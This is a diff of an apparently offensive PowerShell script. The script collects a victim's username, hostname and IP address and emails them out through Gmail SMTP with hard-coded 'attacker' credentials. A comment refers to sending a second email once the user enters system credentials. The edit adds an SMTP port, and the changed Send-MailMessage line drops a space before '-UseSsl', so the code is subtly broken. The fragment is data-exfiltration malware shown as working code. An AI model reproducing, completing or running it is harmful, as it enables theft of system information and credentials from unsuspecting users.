@@ -53,6 +53,7 @@ Param ()
 }
 
 $SmtpServer = 'smtp.gmail.com'
+$SmtpPort = 587
 $SmtpUser = 'attacker@gmail.com'
 $smtpPassword = '123'
 $MailtTo = 'victim@gmail.com'
@@ -76,7 +77,7 @@ $ip_output = "IP : "
 $newline = "`r`n"
 
 $sysinfo = $username_output+$username_command+$newline+$hostname_output+$hostname_command+$newline+$ip_output+$ipaddr_command+$newline
-Send-MailMessage -To "$MailtTo" -from "$MailFrom" -Subject $MailSubject -Body $sysinfo -SmtpServer $SmtpServer -UseSsl -Credential $Credentials
+Send-MailMessage -To "$MailtTo" -from "$MailFrom" -Subject $MailSubject -Body $sysinfo -SmtpServer $SmtpServer -Port $SmtpPort-UseSsl -Credential $Credentials
 
 
 # SEND SECOND EMAIL IF USER ENTER SYSTEM CREDENTIALS
